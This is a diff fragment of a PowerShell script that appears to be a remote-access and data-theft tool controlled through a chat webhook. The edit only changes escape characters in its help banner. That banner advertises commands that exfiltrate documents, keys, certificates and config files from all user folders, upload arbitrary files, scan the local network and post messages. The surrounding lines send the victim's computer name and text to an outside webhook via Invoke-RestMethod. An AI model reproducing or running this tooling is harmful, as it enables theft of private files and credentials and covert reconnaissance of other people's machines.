@@ -78,9 +78,9 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 
 Function ExtraInfo{
 $msgsys = "``=========  Exfiltrate Command Examples ==================
-= ( PS`> Exfiltrate -Path Documents -Filetype png )     =
-= ( PS`> Exfiltrate -Filetype log )                     =
-= ( PS`> Exfiltrate )                                   =
+= ( PS> Exfiltrate -Path Documents -Filetype png )     =
+= ( PS> Exfiltrate -Filetype log )                     =
+= ( PS> Exfiltrate )                                   =
 = Exfiltrate only will send many pre-defined filetypes  =
 = from all User Folders like Documents, Downloads etc.. =
 = ----------------------------------------------------- =
@@ -92,13 +92,13 @@ $msgsys = "``=========  Exfiltrate Command Examples ==================
 = wdoc, xdoc, cer, key, xls, xlsx,                      =
 = cfg, conf, docx, rft.                                 =
 ===================  Upload Command Example =============
-= ( PS`> Upload -Path C:/Path/To/File.txt )             =
+= ( PS> Upload -Path C:/Path/To/File.txt )             =
 = Use 'Folder-Tree' command to show all files           =
 =================  Enumerate-LAN Example ================
-( PS`> Enumerate-LAN -Prefix 192.168.1. )               =
+( PS> Enumerate-LAN -Prefix 192.168.1. )               =
 This Eg. will scan 192.168.1.1 to 192.168.1.254         =
 ==================  Message Example =====================
-( PS`> Message 'Your Message Here!' )                   =
+( PS> Message 'Your Message Here!' )                   =
 =========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
